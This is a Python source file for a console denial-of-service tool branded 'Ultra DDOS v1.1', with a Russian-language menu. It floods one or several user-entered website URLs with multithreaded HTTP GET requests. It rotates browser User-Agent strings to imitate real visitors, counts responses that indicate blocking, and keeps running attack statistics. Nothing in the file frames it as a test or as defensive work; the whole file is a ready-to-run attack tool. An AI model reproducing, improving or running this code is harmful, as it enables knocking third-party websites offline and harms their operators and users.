import os
import sys
import time
import random
import json
import threading
import requests

# ================= ВКЛЮЧАЕМ ANSI ДЛЯ WINDOWS =================
if os.name == 'nt':
    try:
        import ctypes
        kernel32 = ctypes.windll.kernel32
        kernel32.SetConsoleMode(kernel32.GetStdHandle(-11), 7)
    except:
        pass

# ================= НАСТРОЙКИ =================
MAX_THREADS = 30
TIMEOUT = 5

# ================= ЗЕЛЁНЫЙ ГРАДИЕНТ =================
G1 = "\033[38;2;0;60;0m"
G2 = "\033[38;2;0;90;0m"
G3 = "\033[38;2;0;120;0m"
G4 = "\033[38;2;0;160;0m"
G5 = "\033[38;2;0;200;0m"
G6 = "\033[38;2;0;230;0m"
G7 = "\033[38;2;50;255;50m"
GW = "\033[38;2;200;255;200m"

R = "\033[91m"
G = "\033[92m"
Y = "\033[93m"
C = "\033[96m"
W = "\033[97m"
E = "\033[0m"

# ================= USER-AGENTS =================
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/120.0.0.0',
    'Mozilla/5.0 (X11; Linux x86_64) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/121.0',
    'Mozilla/5.0 (Android 14; Mobile; rv:109.0) Gecko/109.0 Firefox/121.0',
]

# ================= СТАТИСТИКА =================
def load_stats():
    try:
        with open('stats.json', 'r') as f:
            return json.load(f)
    except:
        return {"attacks": 0, "requests": 0, "success": 0, "errors": 0}

def save_stats(s):
    with open('stats.json', 'w') as f:
        json.dump(s, f, indent=4)

def update_stats(a):
    """Обновляет глобальную статистику после атаки"""
    s = load_stats()
    s["attacks"] += 1
    s["requests"] += a.req
    s["success"] += a.ok
    s["errors"] += a.err
    save_stats(s)

# ================= ВСПОМОГАТЕЛЬНЫЕ =================
def clear():
    os.system('cls' if os.name == 'nt' else 'clear')

def bar(p, w=20):
    p = max(0, min(100, p))
    f = int(w * p / 100)
    return f"[{G7 + '█' * f + E + '░' * (w - f)}] {p}%"

# ================= БАННЕР =================
def banner():
    clear()
    print(f"""
{G1} ██    ██  ██▓  ▄▄▄█████▓ ██▀███   ▄▄▄         ▓█████▄ ▓█████▄  ▒█████    ██████ {E}
{G2}  ██  ▓██▒▓██▒  ▓  ██▒ ▓▒▓██ ▒ ██▒▒████▄       ▒██▀ ██▌▒██▀ ██▌▒██▒  ██▒▒██    ▒ {E}
{G3}  ▓██  ▒██░▒██░  ▒ ▓██░ ▒░▓██ ░▄█ ▒▒██  ▀█▄     ░██   █▌░██   █▌▒██░  ██▒░ ▓██▄   {E}
{G4}  ▓▓█  ░██░▒██░  ░ ▓██▓ ░ ▒██▀▀█▄  ░██▄▄▄▄██    ░▓█▄   ▌░▓█▄   ▌▒██   ██░  ▒   ██▒{E}
{G5}  ▒▒█████▓ ░██████▒▒██▒ ░ ░██▓ ▒██▒ ▓█   ▓██▒   ░▒████▓ ░▒████▓ ░ ████▓▒░▒██████▒▒{E}
{G6}  ░▒▓▒ ▒ ▒ ░ ▒░▓  ░▒ ░░   ░ ▒▓ ░▒▓░ ▒▒   ▓▒█░    ▒▒▓  ▒  ▒▒▓  ▒ ░ ▒░▒░▒░ ▒ ▒▓▒ ▒ ░{E}
{G5}  ░░▒░ ░ ░ ░ ░ ▒  ░  ░      ░▒ ░ ▒░  ▒   ▒▒ ░    ░ ▒  ▒  ░ ▒  ▒   ░ ▒ ▒░ ░ ░▒  ░ ░{E}
{G3}   ░░░ ░ ░   ░ ░   ░        ░░   ░   ░   ▒       ░ ░  ░  ░ ░  ░ ░ ░ ░ ▒  ░  ░  ░  {E}
{G2}     ░         ░  ░          ░           ░  ░      ░       ░        ░ ░        ░  {E}
{G1}                                               ░       ░                           {E}
{G7}Ultra DDOS v1.1 | Developer: verifactor @newince
{E}
""")

# ================= HTTP АТАКА =================
class Attack:
    def __init__(self, name=""):
        self.name = name
        self.running = False
        self.req = 0
        self.ok = 0
        self.err = 0
        self.ban = 0
        self.bytes = 0
        self.start = 0
        self.lock = threading.Lock()
        self.session = requests.Session()
    
    def http_worker(self, url):
        try:
            time.sleep(random.uniform(0.05, 0.2))
            headers = {'User-Agent': random.choice(USER_AGENTS)}
            r = self.session.get(url, headers=headers, timeout=TIMEOUT)
            
            with self.lock:
                self.req += 1
                self.bytes += len(r.content)
                if r.status_code in [200, 301, 302, 304, 404]:
                    self.ok += 1
                elif r.status_code in [403, 429, 503, 401]:
                    self.ban += 1
                    self.err += 1
                else:
                    self.err += 1
        except:
            with self.lock:
                self.req += 1
                self.err += 1

    def start_http(self, url, threads):
        self.running = True
        self.req = self.ok = self.err = self.ban = self.bytes = 0
        self.start = time.time()
        
        def worker():
            while self.running:
                self.http_worker(url)
        
        threads_list = []
        for _ in range(threads):
            t = threading.Thread(target=worker, daemon=True)
            t.start()
            threads_list.append(t)
        
        while self.running:
            time.sleep(0.1)
        
        for t in threads_list:
            t.join(timeout=0.1)

    def stop(self):
        self.running = False

# ================= ВЫВОД СТАТУСА =================
def show_attack_status(attacks):
    sys.stdout.write('\033[H\033[J')
    sys.stdout.flush()
    
    banner()
    
    if not attacks:
        return
    
    total_req = sum(a.req for a in attacks)
    total_ok = sum(a.ok for a in attacks)
    total_err = sum(a.err for a in attacks)
    total_bytes = sum(a.bytes for a in attacks)
    total_elapsed = int(time.time() - attacks[0].start) if attacks and attacks[0].start else 0
    
    output = f"""
{G7}⚡ {'КОМБО-АТАКА' if len(attacks) > 1 else 'АТАКА'} В ПРОЦЕССЕ ⚡
{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

{G6}Активных атак: {W}{len(attacks)}
{G6}Всего запросов: {W}{total_req:,}
{G6}Успешно: {G}{total_ok:,}{E}
{G6}Ошибки: {R}{total_err:,}{E}
{G6}Данные: {W}{total_bytes/1024/1024:.1f} MB
{G6}Время: {W}{total_elapsed//3600:02d}:{total_elapsed%3600//60:02d}:{total_elapsed%60:02d}

{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
"""
    
    for i, a in enumerate(attacks, 1):
        elapsed = int(time.time() - a.start) if a.start else 0
        rate = int(a.req / elapsed) if elapsed > 0 else 0
        load = min(100, int((rate / 10) * 100)) if rate > 0 else 0
        
        output += f"""
{G5}[{i}] {a.name}
{G6}  Запросы: {W}{a.req:,}  {G}✓{a.ok}  {R}✗{a.err}{E}  {G7}{bar(load)}{E}
{G6}  Скорость: {W}{rate} r/s  {G6}Время: {elapsed}с
"""
    
    output += f"""
{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G7}[Press ENTER to stop all]
{E}
"""
    sys.stdout.write(output)
    sys.stdout.flush()

# ================= ОДИНОЧНАЯ АТАКА =================
def single_attack():
    clear()
    banner()
    
    print(f"{G7}ВЫБОР ЦЕЛИ{E}")
    url = input(f"{G6}URL: {W}")
    if not url:
        print(f"{R}Ошибка! URL не может быть пустым{E}")
        time.sleep(1)
        return
    
    if not url.startswith('http'):
        url = 'http://' + url
    
    threads = 20
    print(f"{G6}Потоки: {W}{threads} (оптимально){E}")
    
    a = Attack(name="HTTP Flood")
    
    t = threading.Thread(target=a.start_http, args=(url, threads), daemon=True)
    t.start()
    
    stop = [False]
    def wait():
        input()
        stop[0] = True
        a.stop()
    threading.Thread(target=wait, daemon=True).start()
    
    try:
        while a.running and not stop[0]:
            show_attack_status([a])
            time.sleep(0.3)
    except KeyboardInterrupt:
        a.stop()
    
    a.stop()
    t.join(timeout=0.5)
    
    # Сохраняем статистику
    update_stats(a)
    
    clear()
    banner()
    print(f"""
{G7}АТАКА ЗАВЕРШЕНА

{G6}Запросы: {W}{a.req:,}
{G6}Успешно: {G}{a.ok:,}{E}
{G6}Ошибки: {R}{a.err:,}{E}
{G6}Время: {W}{int(time.time() - a.start)} сек
{E}
""")
    input(f"{G7}Нажми ENTER для возврата...{E}")

# ================= КОМБО-АТАКА =================
def combo_attack():
    clear()
    banner()
    
    print(f"{G7}КОМБО-АТАКА (несколько целей сразу){E}")
    print(f"{G6}Введи цели через запятую (например: site1.com, site2.com, site3.com){E}")
    targets = input(f"{W}Цели: {E}")
    
    urls = [t.strip() for t in targets.split(',') if t.strip()]
    if not urls:
        print(f"{R}Ошибка! Нет целей{E}")
        time.sleep(1)
        return
    
    urls = [u if u.startswith('http') else 'http://' + u for u in urls]
    
    threads_per_target = 15
    
    print(f"\n{G6}Запускаю {len(urls)} атак по {threads_per_target} потоков...{E}")
    time.sleep(0.5)
    
    attacks = []
    for i, url in enumerate(urls, 1):
        a = Attack(name=f"Target {i}: {url[:20]}...")
        t = threading.Thread(target=a.start_http, args=(url, threads_per_target), daemon=True)
        t.start()
        attacks.append(a)
        time.sleep(0.2)
    
    stop = [False]
    def wait():
        input()
        stop[0] = True
        for a in attacks:
            a.stop()
    threading.Thread(target=wait, daemon=True).start()
    
    try:
        while any(a.running for a in attacks) and not stop[0]:
            show_attack_status(attacks)
            time.sleep(0.3)
    except KeyboardInterrupt:
        for a in attacks:
            a.stop()
    
    for a in attacks:
        a.stop()
        time.sleep(0.1)
    
    # Сохраняем статистику для каждой атаки
    for a in attacks:
        update_stats(a)
    
    clear()
    banner()
    
    total_req = sum(a.req for a in attacks)
    total_ok = sum(a.ok for a in attacks)
    total_err = sum(a.err for a in attacks)
    
    print(f"""
{G7}КОМБО-АТАКА ЗАВЕРШЕНА

{G6}Всего атак: {W}{len(attacks)}
{G6}Всего запросов: {W}{total_req:,}
{G6}Успешно: {G}{total_ok:,}{E}
{G6}Ошибки: {R}{total_err:,}{E}
{G6}Время: {W}{int(time.time() - attacks[0].start)} сек

{G4}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
{G5}Детали по целям:{E}
""")
    
    for i, a in enumerate(attacks, 1):
        print(f"{G5}[{i}] {a.name} — {G}✓{a.ok} {R}✗{a.err}{E}")
    
    print(f"\n{G7}Нажми ENTER для возврата...{E}")
    input()

# ================= МЕНЮ =================
def menu():
    clear()
    banner()
    print(f"""
{G7}ГЛАВНОЕ МЕНЮ

{G6}1.{W} Одиночная атака
{G6}2.{W} КОМБО-АТАКА (несколько целей сразу)
{G5}99.{W} Exit
{E}
""")

# ================= MAIN =================
def main():
    while True:
        menu()
        try:
            ch = input(f"{G7}Выбери: {W}")
        except KeyboardInterrupt:
            print(f"\n{G7}Выход...{E}")
            sys.exit()
            
        if ch == '1':
            single_attack()
        elif ch == '2':
            combo_attack()
        elif ch == '99':
            clear()
            print(f"{G7}Выход...{E}")
            sys.exit()
        else:
            print(f"{R}Неверный выбор!{E}")
            time.sleep(1)

if __name__ == "__main__":
    main()
